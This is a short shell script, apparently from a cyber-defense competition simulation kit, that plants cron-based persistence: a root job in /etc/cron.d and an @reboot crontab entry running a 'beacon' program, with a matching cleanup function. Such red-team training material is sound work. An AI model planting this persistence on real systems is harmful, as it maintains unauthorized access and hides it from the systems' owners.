# technique: cron persistence (guide 2.1)
name="cron-drop"
plant() {
    echo '* * * * * root /usr/local/bin/ccdc-sim-beacon' > /etc/cron.d/ccdc-sim
    ( crontab -l 2>/dev/null | grep -v ccdc-sim; echo '@reboot /usr/local/bin/ccdc-sim-beacon' ) | crontab -
}
clean() {
    rm -f /etc/cron.d/ccdc-sim
    ( crontab -l 2>/dev/null | grep -v ccdc-sim ) | crontab - 2>/dev/null
}
